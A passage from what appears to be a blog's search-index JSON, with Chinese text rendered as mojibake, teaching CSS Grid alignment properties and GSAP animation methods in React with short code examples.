ğŸš€ Codepenï¼šé»é€™è£¡ end å°é½Šç›´å‘ç©ºé–“çš„å°¾ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.box { align-items: end;} ğŸš€ Codepenï¼šé»é€™è£¡ place-itemsç”¨é€”ï¼šåŒæ™‚è¨­å®š align-items èˆ‡ justify-items ç¬¬ä¸€å€‹å€¼è¨­å®š align-items ç¬¬äºŒå€‹å€¼è¨­å®š justify-items ğŸ’¡ è¨» 1ï¼šè‹¥åªè¨­å®šä¸€å€‹å€¼ï¼Œå‰‡è©²å€¼æœƒåŒæ™‚æŒ‡å®šçµ¦å…©å€‹å±¬æ€§ã€‚ğŸ’¡ è¨» 2ï¼šè«‹è¨˜å¾—å…©å€‹å±¬æ€§çš„è¦å‰‡ï¼Œä»€éº¼æ™‚å€™ grid å…ƒç´ è©²æœ‰å¯¬/é«˜åº¦ï¼Œä»€éº¼æ™‚å€™ä¸è©²æœ‰å¯¬/é«˜åº¦ã€‚ğŸ’¡ è¨» 3ï¼šIE ä¸æ”¯æ´é€™å€‹ç¸®å¯«æ³•ã€‚ 1234.box { // ç›´å‘å°é½Šçµ‚é» &amp; æ©«å‘å°é½Šä¸­é–“ place-items: end center;} ğŸš€ Codepenï¼šé»é€™è£¡ å¿«é€Ÿæ°´å¹³ / å‚ç›´ç½®ä¸­1234.box { // ç›´å‘ &amp; æ©«å‘å°é½Šä¸­é–“ place-items: center;} ğŸš€ Codepenï¼šé»é€™è£¡ justify-contentç”¨é€”ï¼šåˆ†é… grid ç©ºé–“ä¸­ã€Œæ©«å‘ã€çš„å‰©é¤˜ç©ºé–“ ğŸ’¡ è¨»ï¼šgrid ç©ºé–“ä¸­å¿…é ˆè¦æœ‰å‰©é¤˜çš„ç©ºé–“ï¼Œé€™å€‹å±¬æ€§æ‰æœ‰ç”¨ã€‚ åœ¨å­¸é€™å€‹å±¬æ€§å‰ï¼Œå»ºè­°å…ˆæ‹†æˆä»¥ä¸‹çš„çµæ§‹ï¼Œæ¯”è¼ƒä¸æœƒææ··ï¼š gridç¶²æ ¼ gridç©ºé–“ gridå…ƒç´  123456789101112131415// gridç©ºé–“.box { width: 960px; // gridç¶²æ ¼ display: grid; // å››æ¬„ grid-template-columns: repeat(4, 100px); // å…©åˆ— grid-template-rows: repeat(2, 100px);}// grid å…ƒç´ .item {...} items èˆ‡ content çš„å·®ç•° justify-items / align-items è¨­å®šçš„æ˜¯ grid å…ƒç´ åœ¨ grid ç¶²æ ¼ä¸­çš„ä½ç½®ã€‚ justify-content / align-content è¨­å®šçš„æ˜¯ grid ç¶²æ ¼åœ¨ grid ç©ºé–“ä¸­çš„ä½ç½®ã€‚ start å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“ä¸Ÿåˆ°æœ€å°¾ç«¯ğŸ’¡ è¨»ï¼šä½ å¯ä»¥æƒ³åƒæ˜¯æŠŠå¤šé¤˜ç©ºé–“ç§»åˆ°å¾Œé¢å¾Œï¼Œ grid ç¶²æ ¼å°±æœƒå¾€èµ·é»è™•(start)è²¼é½Šã€‚ 123.box { justify-content: start;} ğŸš€ Codepenï¼šé»é€™è£¡ end å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“ä¸Ÿåˆ°æœ€é ­ç«¯ğŸ’¡ è¨»ï¼šä½ å¯ä»¥æƒ³åƒæ˜¯æŠŠå¤šé¤˜ç©ºé–“ç§»åˆ°å¾Œé¢å¾Œï¼Œ grid ç¶²æ ¼å°±æœƒå¾€çµ‚é»è™•(end)è²¼é½Šã€‚ 123.box { justify-content: end;} ğŸš€ Codepenï¼šé»é€™è£¡ center å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“åˆ†é…åˆ°å·¦å³å…©å´ğŸ’¡ è¨»ï¼šä½ å¯ä»¥æƒ³åƒæ˜¯æŠŠå¤šé¤˜ç©ºé–“åˆ†é…åˆ°å…©å´å¾Œï¼Œ grid ç¶²æ ¼å°±æœƒå¾€ä¸­é–“è™•(center)è²¼é½Šã€‚ 123.box { justify-content: center;} ğŸš€ Codepenï¼šé»é€™è£¡ space-around å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“å¹³å‡åˆ†é…åˆ° grid å…ƒç´ ä¹‹é–“ä»¥åŠå·¦å³å…©å´ğŸ’¡ è¨» 1ï¼šgrid å…ƒç´ ä¹‹é–“ä¿ç•™ç›¸ç­‰çš„å‰©é¤˜ç©ºé–“ğŸ’¡ è¨» 2ï¼šå·¦å³å…©å´ä¿ç•™ grid å…ƒç´  1/2 çš„å‰©é¤˜ç©ºé–“ 123.box { justify-content: space-around;} ğŸš€ Codepenï¼šé»é€™è£¡ space-between å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“å¹³å‡åˆ†é…åˆ° grid å…ƒç´ ä¹‹é–“ğŸ’¡ è¨»ï¼š åªæœ‰ grid å…ƒç´ ä¹‹é–“æœƒåˆ†é…åˆ°å‰©é¤˜ç©ºé–“ï¼Œå·¦å³å…©å´ä¸æœƒã€‚ 123.box { justify-content: space-between;} ğŸš€ Codepenï¼šé»é€™è£¡ space-evenly å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“å¹³å‡åˆ†é…åˆ° grid å…ƒç´ ä¹‹é–“ä»¥åŠå·¦å³å…©å´ğŸ’¡ è¨»ï¼š grid å…ƒç´ ä¹‹é–“èˆ‡å·¦å³å…©ç«¯çš„å‰©é¤˜ç©ºé–“å‡ç›¸ç­‰ã€‚ 123.box { justify-content: space-evenly;} ğŸš€ Codepenï¼šé»é€™è£¡ align-contentç”¨é€”ï¼šåˆ†é… grid ç©ºé–“ä¸­ã€Œç›´å‘ã€çš„å‰©é¤˜ç©ºé–“ ğŸ’¡ è¨»ï¼šgrid ç©ºé–“ä¸­å¿…é ˆè¦æœ‰å‰©é¤˜çš„ç©ºé–“ï¼Œé€™å€‹å±¬æ€§æ‰æœ‰ç”¨ã€‚ start å°‡ç›´å‘çš„å‰©é¤˜ç©ºé–“ä¸Ÿåˆ°æœ€å°¾ç«¯ğŸ’¡ è¨»ï¼šä½ å¯ä»¥æƒ³åƒæ˜¯æŠŠå¤šé¤˜ç©ºé–“ç§»åˆ°å¾Œé¢å¾Œï¼Œ grid ç¶²æ ¼å°±æœƒå¾€èµ·é»è™•(start)è²¼é½Šã€‚ 123.box { align-content: start;} ğŸš€ Codepenï¼šé»é€™è£¡ end å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“ä¸Ÿåˆ°æœ€é ­ç«¯ğŸ’¡ è¨»ï¼šä½ å¯ä»¥æƒ³åƒæ˜¯æŠŠå¤šé¤˜ç©ºé–“ç§»åˆ°å¾Œé¢å¾Œï¼Œ grid ç¶²æ ¼å°±æœƒå¾€çµ‚é»è™•(end)è²¼é½Šã€‚ 123.box { align-content: end;} ğŸš€ Codepenï¼šé»é€™è£¡ center å°‡ç›´å‘çš„å‰©é¤˜ç©ºé–“åˆ†é…åˆ°å·¦å³å…©å´ğŸ’¡ è¨»ï¼šä½ å¯ä»¥æƒ³åƒæ˜¯æŠŠå¤šé¤˜ç©ºé–“åˆ†é…åˆ°å…©å´å¾Œï¼Œ grid ç¶²æ ¼å°±æœƒå¾€ä¸­é–“è™•(center)è²¼é½Šã€‚ 123.box { align-content: center;} ğŸš€ Codepenï¼šé»é€™è£¡ space-around å°‡ç›´å‘çš„å‰©é¤˜ç©ºé–“å¹³å‡åˆ†é…åˆ° grid å…ƒç´ ä¹‹é–“ä»¥åŠä¸Šä¸‹å…©å´ğŸ’¡ è¨» 1ï¼šgrid å…ƒç´ ä¹‹é–“ä¿ç•™ç›¸ç­‰çš„å‰©é¤˜ç©ºé–“ğŸ’¡ è¨» 2ï¼šä¸Šä¸‹å…©å´ä¿ç•™ grid å…ƒç´  1/2 çš„å‰©é¤˜ç©ºé–“ 123.box { align-content: space-around;} ğŸš€ Codepenï¼šé»é€™è£¡ space-between å°‡ç›´å‘çš„å‰©é¤˜ç©ºé–“å¹³å‡åˆ†é…åˆ° grid å…ƒç´ ä¹‹é–“ğŸ’¡ è¨»ï¼š åªæœ‰ grid å…ƒç´ ä¹‹é–“æœƒåˆ†é…åˆ°å‰©é¤˜ç©ºé–“ï¼Œä¸Šä¸‹å…©å´ä¸æœƒã€‚ 123.box { align-content: space-between;} ğŸš€ Codepenï¼šé»é€™è£¡ space-evenly å°‡æ©«å‘çš„å‰©é¤˜ç©ºé–“å¹³å‡åˆ†é…åˆ° grid å…ƒç´ ä¹‹é–“ä»¥åŠä¸Šä¸‹å…©å´ğŸ’¡ è¨»ï¼š grid å…ƒç´ ä¹‹é–“èˆ‡ä¸Šä¸‹å…©ç«¯çš„å‰©é¤˜ç©ºé–“å‡ç›¸ç­‰ã€‚ 123.box { align-content: space-evenly;} ğŸš€ Codepenï¼šé»é€™è£¡ place-contentç”¨é€”ï¼šåŒæ™‚è¨­å®š align-content èˆ‡ justify-content ç¬¬ä¸€å€‹å€¼è¨­å®š align-content ç¬¬äºŒå€‹å€¼è¨­å®š justify-content ğŸ’¡ è¨» 1ï¼šè‹¥åªè¨­å®šä¸€å€‹å€¼ï¼Œå‰‡è©²å€¼æœƒåŒæ™‚æŒ‡å®šçµ¦å…©å€‹å±¬æ€§ã€‚ğŸ’¡ è¨» 2ï¼šIE ä¸æ”¯æ´é€™å€‹ç¸®å¯«æ³•ã€‚ 12345.box { // ç›´å‘åˆ†é…å‰©é¤˜ç©ºé–“åˆ°ä¸Šä¸‹å…©ç«¯ // æ©«å‘åˆ†é…å‰©é¤˜ç©ºé–“åˆ°å·¦å³å…©ç«¯ place-content: center center;} ğŸš€ Codepenï¼šé»é€™è£¡ justify-selfç”¨é€”ï¼šæ§åˆ¶å–®ä¸€å€‹gridå…ƒç´ åœ¨ã€Œæ©«å‘ã€çš„å°é½Šä½ç½® stretch å¡«æ»¿æ•´å€‹æ©«å‘ç©ºé–“ (é è¨­å€¼)ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æ²’æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { justify-self: stretch;} ğŸš€ Codepenï¼šé»é€™è£¡ start å°é½Šæ©«å‘ç©ºé–“çš„èµ·ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { justify-self: start;} ğŸš€ Codepenï¼šé»é€™è£¡ center å°é½Šæ©«å‘ç©ºé–“çš„ä¸­é–“ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { justify-self: center;} ğŸš€ Codepenï¼šé»é€™è£¡ end å°é½Šæ©«å‘ç©ºé–“çš„å°¾ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šå¯¬åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { justify-self: end;} ğŸš€ Codepenï¼šé»é€™è£¡ align-selfç”¨é€”ï¼šæ§åˆ¶å–®ä¸€å€‹gridå…ƒç´ åœ¨ã€Œç›´å‘ã€çš„å°é½Šä½ç½® stretch å¡«æ»¿æ•´å€‹ç›´å‘ç©ºé–“ (é è¨­å€¼)ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æ²’æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { align-self: stretch;} ğŸš€ Codepenï¼šé»é€™è£¡ start å°é½Šç›´å‘ç©ºé–“çš„èµ·ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { align-self: start;} ğŸš€ Codepenï¼šé»é€™è£¡ center å°é½Šç›´å‘ç©ºé–“çš„ä¸­é–“ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { align-self: center;} ğŸš€ Codepenï¼šé»é€™è£¡ end å°é½Šç›´å‘ç©ºé–“çš„å°¾ç«¯ğŸ’¡ è¨»ï¼šç•¶ grid å…ƒç´ æœ‰è¨­å®šé«˜åº¦æ™‚æ‰æœƒç”Ÿæ•ˆã€‚ 123.item { align-self: end;} ğŸš€ Codepenï¼šé»é€™è£¡ place-selfç”¨é€”ï¼šåŒæ™‚è¨­å®š align-self èˆ‡ justify-self ç¬¬ä¸€å€‹å€¼è¨­å®š align-self ç¬¬äºŒå€‹å€¼è¨­å®š justify-self ğŸ’¡ è¨» 1ï¼šè‹¥åªè¨­å®šä¸€å€‹å€¼ï¼Œå‰‡è©²å€¼æœƒåŒæ™‚æŒ‡å®šçµ¦å…©å€‹å±¬æ€§ã€‚ğŸ’¡ è¨» 2ï¼šè«‹è¨˜å¾—å…©å€‹å±¬æ€§çš„è¦å‰‡ï¼Œä»€éº¼æ™‚å€™ grid å…ƒç´ è©²æœ‰å¯¬/é«˜åº¦ï¼Œä»€éº¼æ™‚å€™ä¸è©²æœ‰å¯¬/é«˜åº¦ã€‚ğŸ’¡ è¨» 3ï¼šIE ä¸æ”¯æ´é€™å€‹ç¸®å¯«æ³•ã€‚ 1234.item { // ç›´å‘å°é½Šä¸­é–“ &amp; æ©«å‘å°é½Šä¸­é–“ place-self: center center;} ğŸš€ Codepenï¼šé»é€™è£¡ orderç”¨é€”ï¼šè¨­å®šgridå…ƒç´ çš„å‰å¾Œé †åº å…¶å¯¦å°±å’Œflexä¸­çš„ order æ˜¯åŒä¸€å€‹æ¦‚å¿µï¼Œæ¯ä¸€å€‹ grid å…ƒç´ çš„ order é è¨­å€¼çš†ç‚º0ã€‚ order å€¼è¶Šå¤§çš„ grid å…ƒç´ ï¼Œæœƒè¢«æ”¾åœ¨è¶Šå‰é¢ã€‚order å€¼è¶Šå°çš„ grid å…ƒç´ ï¼Œæœƒè¢«æ”¾åœ¨è¶Šå¾Œé¢ã€‚ ğŸ’¡ è¨»ï¼šè¦è¨˜å¾—ç•™æ„ç•¶ä¸‹çš„è³‡æ–™æµå‘ï¼Œå“ªå€‹æ–¹å‘ä»£è¡¨å‰é¢ï¼Ÿå“ªå€‹æ–¹å‘ä»£è¡¨å¾Œé¢ï¼Ÿ` 123456789101112131415&lt;!-- åŸæœ¬çš„æ’åº(å·¦ â†’ å³) --&gt;&lt;div class=\"box-normal\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- åéä¾†æ’åº(å³ â†’ å·¦) --&gt;&lt;div class=\"box-reverse\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910111213// åŸæœ¬çš„æ’åº(å·¦ â†’ å³).box-normal .item--yellow { order: 0;}.box-normal .item--blue { order: 0;}.box-normal .item--green { order: 0;}.box-normal .item--pink { order: 0;} ç”±æ–¼æ¯å€‹å…ƒç´ çš„ order å€¼éƒ½ç›¸ç­‰ï¼Œæ‰€ä»¥æœƒä¾ç…§ HTML çš„é †åºä¾†æ’åˆ—ï¼š é»ƒâ†’ è— â†’ ç¶  â†’ ç²‰ ä»¥ä¸‹æˆ‘å€‘é€éä¿®æ”¹ order å€¼ï¼Œä¾†æŠŠé †åºæ›´æ”¹æˆï¼š ç²‰â†’ ç¶  â†’ è— â†’ é»ƒ 12345678910111213// åéä¾†æ’åº(å³ â†’ å·¦).box-reverse .item--yellow { order: 3;}.box-reverse .item--blue { order: 2;}.box-reverse .item--green { order: 1;}.box-reverse .item--pink { order: 0;} ğŸ’¡ åœ¨æˆ‘å€‘æ²’æœ‰è¨­å®š &lt;html&gt; çš„ dirå±¬æ€§æ™‚ï¼Œé è¨­çš„è³‡æ–™æµå‘æœƒæ˜¯ã€Œç”±å·¦ â†’ å³ã€(ltr)ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ åƒè€ƒè³‡æ–™CSS | æ‰€ä»¥æˆ‘èªªé‚£å€‹ç‰ˆèƒ½ä¸èƒ½å¥½åˆ‡ä¸€é»ï¼Ÿ - Grid åŸºæœ¬ç”¨æ³•GRID GARDENFractional unit (FR) overviewA Complete Guide to Grid[CSS] é—œæ–¼ Grid Layout çš„ä½¿ç”¨å§¿å‹¢ã€CSSã€‘Grid ä½ˆå±€ç¸½çµ30 å¤© CSS éš¨æ‰‹ç­†è¨˜ - ç¬¬ 09 å¤© - OMGâ€¦ Grid Layout~!! ( 5/7 - item å±¬æ€§ )The Difference Between Explicit and Implicit GridsCSS GRID: Implicit vs Explicit Tracks â€” 5 of 25CSS Flex &amp; Grid æ’ç‰ˆè©³è§£ï¼ˆä¸‹ï¼‰ï¼šOh My Grid!GRID: A simple visual cheatsheet for CSS Grid LayoutGrid Layout ä¸‰éƒ¨æ›²ï¼šauto-fill ? auto-fit ? æˆ‘å€‘ä¸ä¸€æ¨£ã€‚","link":"/2021/07/26/grid-system/"},{"title":"Gsapï¼å¸¸è¦‹çš„åŸºæœ¬æ–¹æ³•","text":"æ‡¶äººåŒ…ã€‚ gsap.to()è¨­å®šå‹•ç•«çµæŸæ™‚çš„å±¬æ€§ã€‚ä¹Ÿå°±æ˜¯èªªé–‹å§‹æ™‚çš„å±¬æ€§æœƒä»¥åŸæœ¬ CSS è¨­å®šçš„å±¬æ€§ç‚ºä¸»ï¼Œä¾‹å¦‚ï¼š 12345678910111213141516171819202122import { useEffect } from 'react'import { gsap } from 'gsap'function App() { useEffect(() =&gt; { // é¸åˆ° .square é€™å€‹å…ƒç´  gsap.to('.square', { x: 300, // translateX(300px) duration: 1 }) }, []) return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; )}export default App å¦‚æœæˆ‘æƒ³è‡ªå·±æ§åˆ¶å‹•ç•«çš„æ’­æ”¾/æš«åœä¹‹é¡çš„è©±æ€éº¼è¾¦ï¼ŸåŸºæœ¬ä¸Š gsap å¤§éƒ¨åˆ†çš„ API éƒ½æœƒå›å‚³ä¸€å€‹ã€ŒTweenã€ï¼Œç›´ç¿»çš„è©±æœƒç¿»æˆã€Œè£œé–“å‹•ç•«ã€ï¼Œä½†æˆ‘è‡ªå·±æ˜¯ç†è§£æˆé€™æ®µå‹•ç•«çš„ instanceï¼Œè¦ºå¾—é€™æ¨£æ¯”è¼ƒå¥½æ‡‚ä¸€é»ã€‚ æ‰€ä»¥å‰›å‰›çš„ç¯„ä¾‹å¯ä»¥æ”¹å¯«æˆé€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233import { useEffect } from 'react'import { gsap } from 'gsap'function App() { useEffect(() =&gt; { // æŠŠ instance å­˜èµ·ä¾† const tween = gsap.to('.square', { x: 300, duration: 1, paused: true // ç”¨æš«åœä¾†å–æ¶ˆè‡ªå‹•æ’­æ”¾ }) // é€éæŒ‰éˆ• + ç›£è½å™¨ä¾†æ§åˆ¶å‹•ç•«çš„æ’­æ”¾èˆ‡å€’æ”¾ document.querySelector('.play-btn')!.addEventListener('click', () =&gt; { tween.play() }) document.querySelector('.reverse-btn')!.addEventListener('click', () =&gt; { tween.reverse() }) }, []) return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn play-btn'&gt;Start&lt;/button&gt; &lt;button className='btn reverse-btn'&gt;Reverse&lt;/button&gt; &lt;/div&gt; )}export default App æˆ‘æƒ³è¦ã€ŒæŒ‰ç…§é †åºã€ä¾†æ’­æ”¾å‹•ç•«å¦‚æœå–®ç”¨ gsap.to() çš„è©±å¯ä»¥é€é delay ä¾†è¨­å®šå»¶é²æ™‚é–“ï¼Œä¸éç•¶å‹•ç•«å¾ˆè¤‡é›œçš„æ™‚å€™ä¹Ÿè¨±ä½ æœƒæƒ³ç”¨ timeline ä¾†è™•ç†ï¼Œé€™å€‹å¾Œé¢æœƒåœ¨ä»‹ç´¹ï¼Œå…ˆä¸ç”¨å¤ªåœ¨æ„ã€‚ å‡è¨­æˆ‘å€‘æƒ³å¯¦ç¾é€™å€‹æ•ˆæœï¼š é™„è¨»ï¼šå…ˆå¾€å³é‚Šç§»å‹•å¾Œå†å¾€ä¸‹ç§»å‹•ã€‚ é‚£å°±èƒ½é€™æ¨£å­è¨­å®šï¼š 1234567891011121314151617181920212223242526272829import { useEffect } from 'react'import { gsap } from 'gsap'function App() { function demo() { gsap.to('.square', { x: 300, duration: 1 }) gsap.to('.square', { y: 300, delay: 1, duration: 1 }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App gsap.from()è·Ÿ gsap.to åéä¾†çš„æ„æ€ï¼Œé€™é‚Šæ˜¯æ±ºå®šå‹•ç•«é–‹å§‹æ™‚çš„å±¬æ€§ï¼Œå‹•ç•«çµæŸæ™‚æœƒå›åˆ°åŸæœ¬åœ¨ CSS è¨­å®šçš„å±¬æ€§ã€‚ 123456789101112131415161718192021222324import { useEffect } from 'react'import { gsap } from 'gsap'function App() { function demo() { gsap.from('.square', { x: 300, duration: 1 }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App gsap.fromTo()ç•¶ä½ ä¸æƒ³è¦ä¾æ“šåŸæœ¬çš„ CSS å±¬æ€§ä¾†åšå‹•ç•«æ™‚ï¼Œå°±å¯ä»¥ç›´æ¥ç”¨ gsap.fromTo() ä¾†æ±ºå®šå‹•ç•«é–‹å§‹èˆ‡çµæŸæ™‚çš„å±¬æ€§ï¼š é™„è¨»ï¼šæ³¨æ„åŸæœ¬çš„ä½ç½®åœ¨æœ€å‰é¢ï¼Œä½†æŒ‰ä¸‹ Start å¾Œæ˜¯å‹•ç•«æœƒå¾æˆ‘å€‘è¨­å®šçš„ä½ç½®é–‹å§‹ï¼Œè€Œä¸æ˜¯åŸæœ¬ CSS çµ¦çš„ä½ç½®ã€‚ 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'function App() { function demo() { gsap.fromTo( '.square', { x: 300, duration: 1 }, { x: 600, duration: 1 } ) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App gsap.timeline()gsap.timeline() æœƒå›å‚³ä¸€å€‹è‡ªå‹•å¹«ä½ è™•ç†ã€Œé †åºã€çš„æ™‚é–“è»¸ç‰©ä»¶ã€‚ èˆ‰ä¾‹ä¾†èªªå¦‚æœæƒ³å¯¦ä½œé€™æ¨£çš„æ•ˆæœï¼š ä¸€å€‹æ¯”è¼ƒç›´è¦ºçš„åšæ³•æ˜¯é€é delay ä¾†è¨­å®šå»¶é²æ™‚é–“ï¼Œä¾†å¯¦ç¾ã€Œç­‰ A è·‘å®Œå¾Œå†è·‘ Bã€çš„æ•ˆæœï¼Œæ‰€ä»¥é€™é‚Š code æœƒé•·é€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'function App() { function demo() { gsap.to('.square1', { x: 300, duration: 1, ease: 'none' }) gsap.to('.square2', { x: 300, duration: 1, delay: 1, // delay 1 ç§’å¾Œæ‰åŸ·è¡Œ ease: 'none' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App è€å¯¦èªªé€™æ¨£çš„åšæ³•æ²’ä»€éº¼å•é¡Œï¼Œå”¯ä¸€çš„ç¼ºé»å°±æ˜¯è¦è¨ˆç®—æ¯ä¸€å€‹å‹•ç•«çš„å»¶é²æ™‚é–“é‚„è »éº»ç…©çš„è€Œå·²ã€‚ ä½†å¦‚æœç”¨ gsap.timeline ä¾†æ”¹å¯«çš„è©±æœƒè¼•é¬†è¨±å¤šï¼š 1234567891011121314151617181920212223242526272829303132333435import { gsap } from 'gsap'function App() { function demo() { // new ä¸€å€‹æ™‚é–“è»¸çš„ instanceï¼ˆåªæ˜¯ä¸€ç¨®ä¿®é£¾æ³•ï¼Œä¸æ˜¯çœŸçš„ newï¼‰ const timeline = gsap.timeline() timeline // ç¬¬ä¸€æ®µå‹•ç•« .to('.square1', { duration: 1, x: 300, ease: 'none' }) // ç¬¬äºŒæ®µå‹•ç•« .to('.square2', { duration: 1, x: 300, ease: 'none' }) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App å‡ºä¾†çš„çµæœæ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼š ç”¨æ™‚é–“è»¸çš„å¥½è™•å¾ˆæ˜é¡¯ï¼Œå°±æ˜¯ä½ åªè¦æŠŠæŒ‰ç…§é †åºå» call å°æ‡‰çš„ function å°±å¥½ï¼Œtimeline æœƒè‡ªå‹•å¹«æˆ‘å€‘æå®šå¥½å»¶é²çš„å•é¡Œã€‚ ä½ç½®åƒæ•¸ï¼ˆposition parameterï¼‰æƒ³è¦æ›´ç²¾ç¢ºçš„æ§åˆ¶æ™‚é–“è»¸çš„è©±ï¼Œå¯ä»¥åŠ ä¸Šç¬¬ä¸‰å€‹åƒæ•¸ä¾†åšæ§åˆ¶ã€‚è©³ç´°çš„éƒ¨åˆ†å¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ 1. åœ¨æ™‚é–“è»¸çš„èµ·å§‹ä½ç½®æ’å…¥ç§’æ•¸ï¼ˆä¹Ÿå¯ä»¥æƒ³æˆæ™‚å»¶é²ç§’æ•¸çš„æ„æ€ï¼‰ 123456789101112131415161718192021222324252627282930import { gsap } from 'gsap'function App() { function demo() { const timeline = gsap.timeline() timeline.to( '.square1', { duration: 1, x: 300, ease: 'none' }, 2 // æ’å…¥ 2 ç§’ ) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default Appjk 2. æ’å…¥åˆ°å‰ä¸€å€‹æ™‚é–“è»¸çš„èµ·å§‹é»ï¼Œæ›å¥è©±èªªå°±æ˜¯ã€Œè·Ÿä¸Šä¸€å€‹æ™‚é–“è»¸åŒæ­¥ã€ 1234567891011121314151617181920212223242526272829303132333435import { gsap } from 'gsap'function App() { function demo() { const timeline = gsap.timeline() timeline.to('.square1', { duration: 1, x: 300, ease: 'none' }), timeline.to( '.square2', { duration: 1, x: 300, ease: 'none' }, '&lt;' // æ’å…¥åˆ°å‰ä¸€å€‹æ™‚é–“è»¸çš„èµ·å§‹é» ) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App 3. æ’å…¥åˆ°å‰ä¸€å€‹æ™‚é–“è»¸çš„çµ‚é»ï¼Œå…¶å¯¦å°±è·Ÿé è¨­å€¼ä¸€æ¨£ï¼Œæœƒã€Œä¾ç…§é †åºã€ä¾†åŸ·è¡Œã€‚ 1234567891011121314151617181920212223242526272829303132333435import { gsap } from 'gsap'function App() { function demo() { const timeline = gsap.timeline() timeline.to('.square1', { duration: 1, x: 300, ease: 'none' }), timeline.to( '.square2', { duration: 1, x: 300, ease: 'none' }, '&gt;' // æ’å…¥åˆ°å‰ä¸€å€‹æ™‚é–“è»¸çš„çµ‚é» ) } return ( &lt;div className='App'&gt; &lt;div className='wrapper'&gt; &lt;div className='square square1'&gt;&lt;/div&gt; &lt;div className='square square2'&gt;&lt;/div&gt; &lt;/div&gt; &lt;button className='btn' onClick={demo}&gt; Start &lt;/button&gt; &lt;/div&gt; )}export default App","link":"/2022/11/12/gsap-basic-methods/"},{"title":"Gsapï¼context èˆ‡ revertï¼ˆå¯« React çš„å¿…å‚™çŸ¥è­˜ï¼‰","text":"å­¸ä»»ä½•æ±è¥¿çš„ç¬¬ä¸€æ­¥ï¼šå¾è¸©åœ°é›·é–‹å§‹ã€‚ ç°¡è¿°å¦‚æœè¦ç”¨ React 18 ä¾†ä½¿ç”¨ Gsap çš„è©± ï¼Œä¸€å®šè¦å…ˆèªè­˜ context èˆ‡ revert çš„ç”¨é€”ï¼Œä¸ç„¶ä½ å¯èƒ½æœƒåƒæˆ‘ä¸€æ¨£è¸©åˆ°å¾ˆå¤šé›· QQ é¦–å…ˆ React 18 çš„ 